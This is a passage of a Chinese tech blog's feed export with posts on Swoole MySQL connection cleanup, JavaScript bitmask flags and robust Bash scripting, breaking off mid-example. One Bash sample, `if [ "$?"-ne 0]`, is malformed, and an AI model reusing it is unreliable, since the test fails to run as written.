因为对象要被销毁了.</p><p>而swoole_mysql_coro_close中可以看到一系列”关闭操作”和对该client所持有的statement们的清理操作, statement_list是一个链表, statement的标识ID是依赖于指定会话连接的, 索引ID从1开始, 连接关闭了所以statement必须在这时就销毁.</p><p>而222行的<code>client-&gt;cli-&gt;close(client-&gt;cli)</code>是用swoole的client进行了TCP连接关闭.</p><h2 id="结论和进一步深思"><a href="#结论和进一步深思" class="headerlink" title="结论和进一步深思"></a>结论和进一步深思</h2><p>所以我们可以发现, Swoole只对自己进行了清理, 并且关闭了TCP连接, 而没有在MySQL协议层面进行连接关闭, 这样会不会造成MySQL服务端还长期存在连接, 并没有销毁清理的情况呢?</p><p>首先, 在连接尚未关闭但是statement对象被销毁的时候, swoole并不会通知mysql去销毁语句模板, 所以要是长连接的时候有很多语句在swoole端一次性使用了的话, mysql那边应该会一直保存着那些语句模板, 等待这个连接下一次可能的使用.</p><h3 id="验证-查看未关闭的连接"><a href="#验证-查看未关闭的连接" class="headerlink" title="验证: 查看未关闭的连接"></a>验证: 查看未关闭的连接</h3><p>而swoole端对tcp连接关闭后, mysql端没有收到mysql协议层面的关闭消息, 会不会还傻傻等着呢?</p><p>这时候我们可以运行一下脚本, 然后在mysql端使用<code>show full processlist</code>来查看连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show full processlist;</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">| Id  | User | Host            | db   | Command | Time | State    | Info                  |</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">| 151 | root | localhost:58186 | NULL | Query   |    0 | starting | show full processlist |</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>Woo! 除了我们当前连接居然没有其他连接了, 说明MySQL在TCP连接关闭时就”智能”地清除了会话.</p><h3 id="最后验证-真的没有影响吗"><a href="#最后验证-真的没有影响吗" class="headerlink" title="最后验证: 真的没有影响吗?"></a>最后验证: 真的没有影响吗?</h3><p>我们程序员要有刨根问底精神, 连接强制关闭了, 真的没有副作用吗?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show status like &#39;%Abort_%&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Aborted_clients  | 118   |</span><br><span class="line">| Aborted_connects | 0     |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><blockquote><p>Aborted_clients 由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。</p><p>Aborted_connects 尝试已经失败的MySQL服务器的连接的次数。 </p></blockquote><p>可以看到, MySQL统计了异常中断的客户端和连接, 在我们近期的使用中, 没有正确关闭连接的客户端有118个</p><p>但是MySQL既然可以统计到该数据, 自然也可以对这些客户端连接进行正常清理, 比较还有一手TCP层面的逻辑在里头, 但是这样粗暴地关闭, 就像我们平时手机杀程序清内存或者强制关机的操作一样, 一般来说无甚危害, <strong>但是万一哪天真的发生了异常, 客户端大量死掉, 我们也很难去发现了.</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;众所周知, PHP是由C语言编写的, 扩展也不例外, Swoole又是PHP扩展中发展的比较快且很权威的一个扩展, 对于MySQL这部分模块的浅析, 暂可不必了解Swoole底层的实现, 而先关注应用层面的实现.&lt;/p&gt;
&lt;h2 id=&quot;基础要求&quot;&gt;&lt;a href=&quot;#基础要求&quot; class=&quot;headerlink&quot; title=&quot;基础要求&quot;&gt;&lt;/a&gt;基础要求&lt;/h2&gt;&lt;p&gt;所以除了PHP我们仅需了解以下几个方面的知识:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;MySQL基础&lt;/li&gt;
&lt;li&gt;TCP网络协议基础(MySQL协议)&lt;/li&gt;
&lt;li&gt;C语言基础及其简单调试&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;而使用过Swoole的同学一定对以下工具不陌生:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;GDB&lt;/code&gt;(Mac下用&lt;code&gt;LLDB&lt;/code&gt;)和&lt;code&gt;Valgrind&lt;/code&gt;作为源码/内存分析&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Wireshark&lt;/code&gt;或&lt;code&gt;TcpDump&lt;/code&gt;作为网络分析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
      <category term="swoole" scheme="http://www.twosee.cn/tags/swoole/"/>
    
  </entry>
  
  <entry>
    <title>why-not-http2</title>
    <link href="http://www.twosee.cn/2018/04/09/why-not-http2/"/>
    <id>http://www.twosee.cn/2018/04/09/why-not-http2/</id>
    <published>2018-04-09T03:07:20.000Z</published>
    <updated>2018-04-09T03:07:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Why-not-HTTP2"><a href="#Why-not-HTTP2" class="headerlink" title="Why not HTTP2"></a>Why not HTTP2</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Why-not-HTTP2&quot;&gt;&lt;a href=&quot;#Why-not-HTTP2&quot; class=&quot;headerlink&quot; title=&quot;Why not HTTP2&quot;&gt;&lt;/a&gt;Why not HTTP2&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="Http2" scheme="http://www.twosee.cn/tags/Http2/"/>
    
  </entry>
  
  <entry>
    <title>[整理]【位运算经典应用】 标志位与掩码</title>
    <link href="http://www.twosee.cn/2018/04/06/mask-code/"/>
    <id>http://www.twosee.cn/2018/04/06/mask-code/</id>
    <published>2018-04-06T15:03:01.000Z</published>
    <updated>2018-04-06T15:03:43.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="整理-【位运算经典应用】-标志位与掩码"><a href="#整理-【位运算经典应用】-标志位与掩码" class="headerlink" title="[整理]【位运算经典应用】 标志位与掩码"></a>[整理]【位运算经典应用】 标志位与掩码</h3><blockquote><p>本文原文来源自 <a href="http://www.cnblogs.com/zichi/p/4792589.html" target="_blank" rel="noopener">http://www.cnblogs.com/zichi/p/4792589.html</a></p><p>相关内容经过整理, ABCD几个水果单词更加容易对应起来</p></blockquote><p>前面我们已经了解了六大位操作符（<code>&amp;</code> <code>|</code> <code>~</code> <code>^</code> <code>&lt;&lt;</code> <code>&gt;&gt;</code>)的用法（<a href="http://www.cnblogs.com/zichi/p/4787145.html" target="_blank" rel="noopener">javascript 位运算</a>），也整理了一些常用的位运算操作（<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a>），本文我们继续深入位运算，来了解下二进制的经典应用-标志位与掩码。</p><p>位运算经常被用来创建、处理以及读取标志位序列——一种类似二进制的变量。虽然可以使用变量代替标志位序列，但是这样可以节省内存（1/32）。</p><p>例如有4个标志位：</p><ol><li>标志位A： 我们有 Apple</li><li>标志位B： 我们有 Banana</li><li>标志位C： 我们有 Cherry</li><li>标志位D： 我们有 Dew</li></ol><p>标志位通过位序列DCBA来表示，当一个位置被置为1时，表示有该项，置为0时，表示没有该项。例如一个变量flag=9，二进制表示为1001，就表示我们有D和A。</p><p>掩码 (bitmask) 是一个通过与/或来读取标志位的位序列。典型的定义每个标志位的原语掩码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> FLAG_A = <span class="number">1</span>; <span class="comment">// 0001</span></span><br><span class="line"><span class="keyword">var</span> FLAG_B = <span class="number">2</span>; <span class="comment">// 0010</span></span><br><span class="line"><span class="keyword">var</span> FLAG_C = <span class="number">4</span>; <span class="comment">// 0100</span></span><br><span class="line"><span class="keyword">var</span> FLAG_D = <span class="number">8</span>; <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>新的掩码可以在以上掩码上使用逻辑运算创建。例如，掩码 1011 可以通过 FLAG_A、FLAG_B 和 FLAG_D 逻辑或得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mask = FLAG_A | FLAG_B | FLAG_D; <span class="comment">// 0001 | 0010 | 1000 =&gt; 1011</span></span><br></pre></td></tr></table></figure><p>某个特定的位可以通过与掩码做逻辑与运算得到，通过与掩码的与运算可以去掉无关的位，得到特定的位。例如，掩码 0100 可以用来检查标志位 C 是否被置位：（<strong>核心就是判断某位上的数</strong> 参考<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a> 下同）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Cherry</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FLAG_C) &#123; <span class="comment">// 0101 &amp; 0100 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个有多个位被置位的掩码表达任一/或者的含义。例如，以下两个表达是等价的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Banana 或者 Cherry 至少一个</span></span><br><span class="line"><span class="comment">// (0101 &amp; 0010) || (0101 &amp; 0100) =&gt; 0000 || 0100 =&gt; true</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; FLAG_B) || (flags &amp; FLAG_C)) &#123;</span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C; <span class="comment">// 0010 | 0100 =&gt; 0110</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; mask) &#123; <span class="comment">// 0101 &amp; 0110 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过与掩码做或运算设置标志位，掩码中为 1 的位可以设置对应的位。例如掩码 1100 可用来设置位 C 和 D：（<strong>核心就是将某位变为1</strong> ）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们有 Cherry 和 Dew</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_C | FLAG_D; <span class="comment">// 0100 | 1000 =&gt; 1100</span></span><br><span class="line">flags |= mask;   <span class="comment">// 0101 | 1100 =&gt; 1101</span></span><br></pre></td></tr></table></figure><p>可以通过与掩码做与运算清除标志位，掩码中为 0 的位可以设置对应的位。掩码可以通过对原语掩码做非运算得到。例如，掩码 1010 可以用来清除标志位 A 和 C ：（<strong>核心就是将某位变为0</strong>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~(FLAG_A | FLAG_C); <span class="comment">// ~0101 =&gt; 1010</span></span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure><p>如上的掩码同样可以通过 ~FLAG_A &amp; ~FLAG_C 得到（德摩根定律）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~FLAG_A &amp; ~FLAG_C;</span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure><p>标志位可以使用异或运算切换。所有值为 1 的为可以切换对应的位。例如，掩码 0110 可以用来切换标志位 B 和 C：（<strong>核心就是将某位取反</strong>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们以前没有 Banana ，那么我们现在有 Banana</span></span><br><span class="line"><span class="comment">// 但是如果我们已经有了一个，那么现在没有了</span></span><br><span class="line"><span class="comment">// 对 Cherry 也是相同的情况</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C;</span><br><span class="line">flags = flags ^ mask;   <span class="comment">// 1100 ^ 0110 =&gt; 1010</span></span><br></pre></td></tr></table></figure><p>最后，所有标志位可以通过非运算翻转：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entering parallel universe...</span></span><br><span class="line">flags = ~flags;    <span class="comment">// ~1010 =&gt; 0101</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;整理-【位运算经典应用】-标志位与掩码&quot;&gt;&lt;a href=&quot;#整理-【位运算经典应用】-标志位与掩码&quot; class=&quot;headerlink&quot; title=&quot;[整理]【位运算经典应用】 标志位与掩码&quot;&gt;&lt;/a&gt;[整理]【位运算经典应用】 标志位与掩码&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;本文原文来源自 &lt;a href=&quot;http://www.cnblogs.com/zichi/p/4792589.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.cnblogs.com/zichi/p/4792589.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关内容经过整理, ABCD几个水果单词更加容易对应起来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前面我们已经了解了六大位操作符（&lt;code&gt;&amp;amp;&lt;/code&gt; &lt;code&gt;|&lt;/code&gt; &lt;code&gt;~&lt;/code&gt; &lt;code&gt;^&lt;/code&gt; &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;)的用法（&lt;a href=&quot;http://www.cnblogs.com/zichi/p/4787145.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;javascript 位运算&lt;/a&gt;），也整理了一些常用的位运算操作（&lt;a href=&quot;http://www.cnblogs.com/zichi/p/4789439.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;常用位运算整理&lt;/a&gt;），本文我们继续深入位运算，来了解下二进制的经典应用-标志位与掩码。&lt;/p&gt;
&lt;p&gt;位运算经常被用来创建、处理以及读取标志位序列——一种类似二进制的变量。虽然可以使用变量代替标志位序列，但是这样可以节省内存（1/32）。&lt;/p&gt;
&lt;p&gt;例如有4个标志位：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;标志位A： 我们有 Apple&lt;/li&gt;
&lt;li&gt;标志位B： 我们有 Banana&lt;/li&gt;
&lt;li&gt;标志位C： 我们有 Cherry&lt;/li&gt;
&lt;li&gt;标志位D： 我们有 Dew&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;标志位通过位序列DCBA来表示，当一个位置被置为1时，表示有该项，置为0时，表示没有该项。例如一个变量flag=9，二进制表示为1001，就表示我们有D和A。&lt;/p&gt;
&lt;p&gt;掩码 (bitmask) 是一个通过与/或来读取标志位的位序列。典型的定义每个标志位的原语掩码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_A = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_B = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_C = &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_D = &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="mask" scheme="http://www.twosee.cn/tags/mask/"/>
    
  </entry>
  
  <entry>
    <title>[整理] 写出健壮的Shell脚本及Shell异常处理</title>
    <link href="http://www.twosee.cn/2018/03/18/stronger-shell/"/>
    <id>http://www.twosee.cn/2018/03/18/stronger-shell/</id>
    <published>2018-03-18T08:58:16.000Z</published>
    <updated>2018-04-05T08:45:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>许多人用shell脚本完成一些简单任务，而且变成了他们生命的一部分。不幸的是，shell脚本在运行异常时会受到非常大的影响。在写脚本时将这类问题最小化是十分必要的。本文中我将介绍一些让bash脚本变得健壮的技术。</p><h1 id="使用set-u"><a href="#使用set-u" class="headerlink" title="使用set -u"></a>使用set -u</h1><p>你因为没有对变量初始化而使脚本崩溃过多少次？对于我来说，很多次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chroot=$1</span><br><span class="line">...</span><br><span class="line">rm -rf $chroot/usr/share/doc</span><br></pre></td></tr></table></figure><p>如果上面的代码你没有给参数就运行，你不会仅仅删除掉chroot中的文档，而是将系统的所有文档都删除。那你应该做些什么呢？好在bash提供了<em>set -u</em>，当你使用未初始化的变量时，让bash自动退出。你也可以使用可读性更强一点的<code>set -o nounset</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> bash /tmp/shrink-chroot.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">chroot=</span></span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> bash -u /tmp/shrink-chroot.sh</span></span><br><span class="line"></span><br><span class="line">/tmp/shrink-chroot.sh: line 3: $1: unbound variable</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span></span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="使用set-e"><a href="#使用set-e" class="headerlink" title="使用set -e"></a>使用set -e</h1><p>你写的每一个脚本的开始都应该包含<em>set -e</em>。这告诉bash一但有任何一个语句返回非真的值，则退出bash。使用-e的好处是避免错误滚雪球般的变成严重错误，能尽早的捕获错误。更加可读的版本：<code>set -o errexit</code></p><p>使用-e把你从检查错误中解放出来。如果你忘记了检查，bash会替你做这件事。不过你也没有办法使用<em>$?</em>来获取命令执行状态了，因为bash无法获得任何非0的返回值。你可以使用另一种结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command</span><br><span class="line"></span><br><span class="line">if [ "$?"-ne 0]; then echo "command failed"; exit 1; fi</span><br></pre></td></tr></table></figure><p>可以替换成：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">command || &#123; echo "command failed"; exit 1; &#125;</span><br></pre></td></tr></table></figure></p><p>或者使用：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if ! command; then echo "command failed"; exit 1; fi</span><br></pre></td></tr></table></figure></p><p>如果你必须使用返回非0值的命令，或者你对返回值并不感兴趣呢？你可以使用 <code>command || true</code> ，或者你有一段很长的代码，你可以暂时关闭错误检查功能，不过我建议你谨慎使用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set +e</span><br><span class="line"></span><br><span class="line">command1</span><br><span class="line"></span><br><span class="line">command2</span><br><span class="line"></span><br><span class="line">set -e</span><br></pre></td></tr></table></figure><p>相关文档指出，bash默认返回管道中最后一个命令的值，也许是你不想要的那个。比如执行 <code>false | true</code> 将会被认为命令成功执行。如果你想让这样的命令被认为是执行失败，可以使用 <code>set -o pipefail</code></p><h1 id="程序防御-考虑意料之外的事"><a href="#程序防御-考虑意料之外的事" class="headerlink" title="程序防御 - 考虑意料之外的事"></a>程序防御 - 考虑意料之外的事</h1><p>你的脚本也许会被放到“意外”的账户下运行，像缺少文件或者目录没有被创建等情况。你可以做一些预防这些错误事情。比如，当你创建一个目录后，如果父目录不存在，<strong><code>mkdir</code></strong> 命令会返回一个错误。如果你创建目录时给<strong><code>mkdir</code></strong>命令加上-p选项，它会在创建需要的目录前，把需要的父目录创建出来。另一个例子是 <strong><code>rm</code></strong> 命令。如果你要删除一个不存在的文件，它会“吐槽”并且你的脚本会停止工作。（因为你使用了-e选项，对吧？）你可以使用-f选项来解决这个问题，在文件不存在的时候让脚本继续工作。 </p><h1 id="准备好处理文件名中的空格"><a href="#准备好处理文件名中的空格" class="headerlink" title="准备好处理文件名中的空格"></a>准备好处理文件名中的空格</h1><p>有些人从在文件名或者命令行参数中使用空格，你需要在编写脚本时时刻记得这件事。你需要时刻记得用引号包围变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if [ $filename = "foo" ];</span><br><span class="line"></span><br><span class="line">当*$filename*变量包含空格时就会挂掉。可以这样解决：</span><br><span class="line"></span><br><span class="line">if [ "$filename" = "foo" ];</span><br></pre></td></tr></table></figure><p>使用<code>$@</code>变量时，你也需要使用引号，因为空格隔开的两个参数会被解释成两个独立的部分。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> <span class="function"><span class="title">foo</span></span>() &#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> &#125;; foo bar <span class="string">"baz quux"</span></span></span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line"></span><br><span class="line">baz</span><br><span class="line"></span><br><span class="line">quux</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> <span class="function"><span class="title">foo</span></span>() &#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> &#125;; foo bar <span class="string">"baz quux"</span></span></span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line"></span><br><span class="line">baz quux</span><br></pre></td></tr></table></figure><p>我没有想到任何不能使用<em>“$@”</em>的时候，所以当你有疑问的时候，使用引号就没有错误。</p><p>如果你同时使用find和xargs，你应该使用 -print0 来让字符分割文件名，而不是换行符分割。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> touch <span class="string">"foo bar"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> find | xargs ls</span></span><br><span class="line"></span><br><span class="line">ls: ./foo: No such file or directory</span><br><span class="line"></span><br><span class="line">ls: bar: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> find -print0 | xargs -0 ls</span></span><br><span class="line"></span><br><span class="line">./foo bar</span><br></pre></td></tr></table></figure><h1 id="设置的陷阱"><a href="#设置的陷阱" class="headerlink" title="设置的陷阱"></a>设置的陷阱</h1><p>当你编写的脚本挂掉后，文件系统处于未知状态。比如锁文件状态、临时文件状态或者更新了一个文件后在更新下一个文件前挂掉。如果你能解决这些问题，无论是 删除锁文件，又或者在脚本遇到问题时回滚到已知状态，你都是非常棒的。幸运的是，bash提供了一种方法，当bash接收到一个UNIX信号时，运行一个 命令或者一个函数。可以使用<strong>trap</strong>命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">trap</span> <span class="built_in">command</span> signal [signal …]</span><br></pre></td></tr></table></figure><p>你可以链接多个信号（列表可以使用kill -l获得），但是为了清理残局，我们只使用其中的三个：<em>INT</em>，<em>TERM</em>和<em>EXIT</em>。你可以使用-as来让traps恢复到初始状态。</p><h4 id="信号描述"><a href="#信号描述" class="headerlink" title="信号描述"></a>信号描述</h4><table><thead><tr><th>INT</th><th>Interrupt - 当有人使用Ctrl-C终止脚本时被触发</th></tr></thead><tbody><tr><td>TERM</td><td>Terminate - 当有人使用kill杀死脚本进程时被触发</td></tr><tr><td>EXIT</td><td>Exit - 这是一个伪信号，当脚本正常退出或者set -e后因为出错而退出时被触发</td></tr></tbody></table><p>当你使用锁文件时，可以这样写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if [ ! -e $lockfile ]; then</span><br><span class="line"></span><br><span class="line">touch $lockfile</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm $lockfile</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "critical-section is already running"</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>当最重要的部分(critical-section)正在运行时，如果杀死了脚本进程，会发生什么呢？锁文件会被扔在那，而且你的脚本在它被删除以前再也不会运行了。解决方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -e $lockfile ]; then</span><br><span class="line"></span><br><span class="line">trap " rm -f $lockfile; exit" INT TERM EXIT</span><br><span class="line"></span><br><span class="line">touch $lockfile</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm $lockfile</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "critical-section is already running"</span><br><span class="line"></span><br><span 